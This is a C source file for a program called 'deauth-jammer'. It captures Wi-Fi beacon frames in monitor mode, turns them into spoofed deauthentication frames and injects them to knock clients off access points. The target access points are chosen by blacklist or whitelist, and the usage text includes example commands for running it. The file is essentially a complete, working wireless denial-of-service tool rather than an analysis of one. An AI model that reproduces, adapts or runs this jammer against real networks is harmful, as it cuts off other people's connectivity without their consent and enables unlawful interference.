/*
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; version 2.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc.,
 *   51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 *   Marco Porsch <marco.porsch@s2005.tu-chemnitz.de>
 *
 *   based on Packetspammer (c)2007 Andy Green <andy@warmcat.com>
 *   mac_addr_a2n taken from iw utility (c)2007,2008 Johannes Berg <johannes@sipsolutions.net>
 */

#include "deauth-jammer.h"
#include "radiotap.h"


#define PCAP_SNAPLEN	500


static void hexDump (char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = addr;

    // Output description if given.
    if (desc != NULL)
        printf ("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf ("  %s\n", buff);

            // Output the offset.
            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf ("  %s\n", buff);
}

static int check_mac_list(struct ieee80211_mgmt *mgmt, u8 *mac_list, size_t mac_list_size)
{
	int i;
	int found = 0;

	for (i = 0; i < mac_list_size; i++) {
		if (memcmp(mgmt->sa, mac_list + i * ETH_ALEN, ETH_ALEN) == 0) {
			found = 1;
			break;
		}
	}

	return found;
}

static int radiotap_parse(u8 *pcap)
{

//	// this is where we store a summary of the
//	// information from the radiotap header
//	typedef struct  {
//		int m_nChannel;
//		int m_nChannelFlags;
//		int m_nRate;
//		int m_nAntenna;
//		int m_nRadiotapFlags;
//	} __attribute__((packed)) rt_data_t;
//
//
//	struct ieee80211_radiotap_iterator rti;
//	rt_data_t rt_data;
	struct ieee80211_radiotap_header *rt_header;
	u16 rt_headerlen;

	rt_header = (struct ieee80211_radiotap_header *) pcap;
	rt_headerlen = le16_to_cpu(rt_header->it_len);

//	if (ieee80211_radiotap_iterator_init(&rti, rt_header, rt_headerlen) < 0)
//		return -1;
//
//	while (ieee80211_radiotap_iterator_next(&rti) == 0) {
//		switch (rti.this_arg_index) {
//		case IEEE80211_RADIOTAP_RATE:
//			rt_data.m_nRate = (*rti.this_arg);
//			break;
//		case IEEE80211_RADIOTAP_CHANNEL:
//			rt_data.m_nChannel =
//			    le16_to_cpu(*((u16 *)rti.this_arg));
//			rt_data.m_nChannelFlags =
//			    le16_to_cpu(*((u16 *)(rti.this_arg + 2)));
//			break;
//		case IEEE80211_RADIOTAP_ANTENNA:
//			rt_data.m_nAntenna = (*rti.this_arg) + 1;
//			break;
//		case IEEE80211_RADIOTAP_FLAGS:
//			rt_data.m_nRadiotapFlags = *rti.this_arg;
//			break;
//		}
//	}
//
//	printf("RX: Rate: %2d.%dMbps, Freq: %d.%dGHz, "
//	    "Ant: %d, Flags: 0x%X\n",
//	    rt_data.m_nRate / 2, 5 * (rt_data.m_nRate & 1),
//	    rt_data.m_nChannel / 1000,
//	    rt_data.m_nChannel - ((rt_data.m_nChannel / 1000) * 1000),
//	    rt_data.m_nAntenna,
//	    rt_data.m_nRadiotapFlags);

	return rt_headerlen;
}

int do_deauth(pcap_t *capture, const struct ieee80211_mgmt *mgmt_rx, const int is_dryrun)
{
	static const u8 rtap_tx[] = {
		0x00, 0x00, // <-- radiotap version
		0x0c, 0x00, // <- radiotap header length
		0x04, 0x80, 0x00, 0x00, // <-- bitmap
		0x00, // <-- rate
		0x00, // <-- padding for natural alignment
		0x08, 0x00, // <-- TX flags (IEEE80211_RADIOTAP_F_TX_NOACK)
	};
	struct ieee80211_mgmt *mgmt_tx;
	static u8 tx_buffer[sizeof(rtap_tx) + 24 + 2];
	int ret;

	/*
	 * turn beacon into deauth:
	 * use own radiotap header
	 * change STYPE to deauth,
	 * keep addresses unchanged,
	 * increase sequence number,
	 * add reason code
	 */
	memcpy(tx_buffer, rtap_tx, sizeof(rtap_tx));
	mgmt_tx = (struct ieee80211_mgmt *) (tx_buffer + sizeof(rtap_tx));
	memcpy(mgmt_tx, mgmt_rx, 24);

	mgmt_tx->frame_control |= cpu_to_le16(IEEE80211_STYPE_DEAUTH);
	mgmt_tx->seq_ctrl = cpu_to_le16(le16_to_cpu(mgmt_rx->seq_ctrl) + 0x00f0); // do not modify fragment number
	mgmt_tx->u.deauth.reason_code = cpu_to_le16(WLAN_REASON_DEAUTH_LEAVING);

	if (is_dryrun) {
		hexDump(NULL, tx_buffer, sizeof(rtap_tx) + 24 + 2);
	} else {
		ret = pcap_inject(capture, tx_buffer, sizeof(rtap_tx) + 24 + 2);
		if (ret != (sizeof(rtap_tx) + 24 + 2)) {
			perror("Trouble injecting packet");
			return -1;
		}
	}

	return 0;
}

void deauth_run(pcap_t *capture, int nDelay, u8 *mac_list, size_t mac_list_size, int is_whitelist, int is_dryrun)
{
	u8 buffer[PCAP_SNAPLEN];
	u8 *pcap = buffer; // XXX why is that required?
	int ret, rt_headerlen;
	struct ieee80211_mgmt *mgmt;
	struct pcap_pkthdr *pcap_header = NULL;

	memset(buffer, 0, sizeof (buffer));
	while (1) {
		// get next beacon capture
		ret = pcap_next_ex(capture, &pcap_header, (const u_char**) &pcap);
		if (ret < 0)
			break;
		if (ret != 1)
			continue;

		rt_headerlen = radiotap_parse(pcap);
		if (rt_headerlen < 0)
			continue;

		mgmt = (struct ieee80211_mgmt *) (pcap + rt_headerlen);

		if (!ieee80211_is_beacon(mgmt->frame_control))
			continue;

		if (is_whitelist == check_mac_list(mgmt, mac_list, mac_list_size))
			continue;

		printf("\ndeauth as %02x:%02x:%02x:%02x:%02x:%02x\n",
		       mgmt->sa[0],
		       mgmt->sa[1],
		       mgmt->sa[2],
		       mgmt->sa[3],
		       mgmt->sa[4],
		       mgmt->sa[5]);

		if (do_deauth(capture, mgmt, is_dryrun))
			break;

		if (nDelay)
			usleep(nDelay);
	}
}

void usage(void)
{
	printf(
	    "Usage: deauth-jammer [options] <interface>\n"
	    "\nOptions\n"
	    "-d, --delay <delay>\t Delay between packets in us [100000]\n"
	    "-m, --macaddr <addr>\t MAC address of AP to suppress/spare depending on w/b\n"
	    "-b, --blacklist\t\t suppress APs in MAC list\n"
	    "-w, --whitelist\t\t spare APs in MAC list\n"
	    "-v  --dry-run\t\t do not send frames, instead just print them\n"
	    "-h, --help\t\t show this dialogue\n"
	    "\nExample:\n"
	    "  sudo iw phy0 interface add mon0 type monitor\n"
	    "  sudo ifconfig mon0 up\n"
	    "  sudo ./deauth-jammer -d 100000 -w -m a1:b2:c3:d4:e5:f6 -v mon0\n"
	    "\n");

	exit(1);
}

int mac_addr_a2n(unsigned char *mac_addr, char *arg)
{
	int i;

	for (i = 0; i < ETH_ALEN ; i++) {
		int temp;
		char *cp = strchr(arg, ':');
		if (cp) {
			*cp = 0;
			cp++;
		}
		if (sscanf(arg, "%x", &temp) != 1)
			return -1;
		if (temp < 0 || temp > 255)
			return -1;

		mac_addr[i] = temp;
		if (!cp)
			break;
		arg = cp;
	}
	if (i < ETH_ALEN - 1)
		return -1;

	return 0;
}


int main(int argc, char *argv[])
{
	char szErrbuf[PCAP_ERRBUF_SIZE];
	int nDelay = 100000, ret;
	pcap_t *capture = NULL;
	struct bpf_program bpfprogram;
	char * szProgram = "type mgt subtype beacon";
	u8 mac_list[10 * ETH_ALEN];
	size_t mac_list_size = 0;
	int is_whitelist = -1, is_dryrun = 0;

	while (1) {
		int nOptionIndex;
		static const struct option options[] = {
			{ "delay", required_argument, NULL, 'd' },
			{ "blacklist", no_argument, NULL, 'b' },
			{ "whitelist", no_argument, NULL, 'w' },
			{ "macaddr", required_argument, NULL, 'm' },
			{ "dry-run", no_argument, NULL, 'v' },
			{ "help", no_argument, NULL, 'h' },
			{ 0, 0, 0, 0 }
		};
		ret = getopt_long(argc, argv, "d:bwm:vh",
			options, &nOptionIndex);
		if (ret == -1)
			break;

		switch (ret) {
		case 0: // long option
			break;
		case 'd': // delay
			nDelay = atoi(optarg);
			break;
		case 'b': // blacklist
			is_whitelist = 0;
			break;
		case 'w': // whitelist
			is_whitelist = 1;
			break;
		case 'm': // macaddr
			if (mac_addr_a2n(mac_list + mac_list_size * ETH_ALEN, optarg))
				usage();
			else
				mac_list_size++;
			break;
		case 'v':
			is_dryrun = 1;
			break;
		case 'h': // help
			usage();
			break;
		default:
			printf("unknown switch %c\n", ret);
			usage();
			break;
		}
	}

	if (argc - optind > 1)
		usage();

	// open the pcap interface
	szErrbuf[0] = '\0';
	capture = pcap_open_live(argv[optind], PCAP_SNAPLEN, 1, 20, szErrbuf);
	if (capture == NULL) {
		printf("Unable to open interface %s in pcap: %s\n",
		    argv[optind], szErrbuf);
		return (1);
	}

	switch (pcap_datalink(capture)) {
		case DLT_PRISM_HEADER:
		case DLT_IEEE802_11_RADIO:
			break;
		default:
			printf("!!! unknown encapsulation on %s !\n", argv[1]);
			return (1);
	}

	if (pcap_compile(capture, &bpfprogram, szProgram, 1, 0) == -1) {
		puts(szProgram);
		puts(pcap_geterr(capture));
		return (1);
	} else {
		if (pcap_setfilter(capture, &bpfprogram) == -1) {
			puts(szProgram);
			puts(pcap_geterr(capture));
		}
		pcap_freecode(&bpfprogram);
	}

	pcap_setnonblock(capture, 1, szErrbuf);

	deauth_run(capture, nDelay, mac_list, mac_list_size, is_whitelist, is_dryrun);

	return (0);
}
